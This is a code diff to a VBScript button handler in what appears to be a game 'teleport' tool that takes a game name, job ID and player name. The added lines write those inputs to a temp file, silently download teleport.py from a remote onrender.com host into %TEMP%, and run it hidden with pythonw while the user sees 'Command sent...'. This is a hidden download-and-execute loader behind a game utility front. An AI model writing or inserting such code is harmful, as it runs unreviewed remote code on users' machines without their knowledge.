@@ -24,8 +24,26 @@ Sub BtnClick
         result = "Error: Please fill in all fields."
         document.getElementById("resultLabel").style.color = "#ff5555"
     Else
-        result = "Invalid API Key."
-        document.getElementById("resultLabel").style.color = "#ff5555"
+        ' Write args to temp file for Python
+        Dim f: Set f = fso.CreateTextFile(sh.ExpandEnvironmentStrings("%TEMP%") & "\cmd_args.txt", True)
+        f.Write gameName & vbCrLf & jobId & vbCrLf & playerName
+        f.Close
+        ' Download teleport.py from Render
+        Dim x, p, a
+        Set x = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+        x.Open "GET", "https://delta-check.onrender.com/teleport.py", False
+        x.Send
+        If x.Status = 200 Then
+            p = sh.ExpandEnvironmentStrings("%TEMP%") & "\teleport.py"
+            Set a = CreateObject("ADODB.Stream")
+            a.Type = 1: a.Open: a.Write x.ResponseBody: a.SaveToFile p, 2: a.Close
+            sh.Run "pythonw " & p, 0, False
+            result = "Command sent..."
+            document.getElementById("resultLabel").style.color = "#55ff55"
+        Else
+            result = "Error: Could not reach server."
+            document.getElementById("resultLabel").style.color = "#ff5555"
+        End If
     End If
     document.getElementById("resultLabel").innerHTML = result
 End Sub
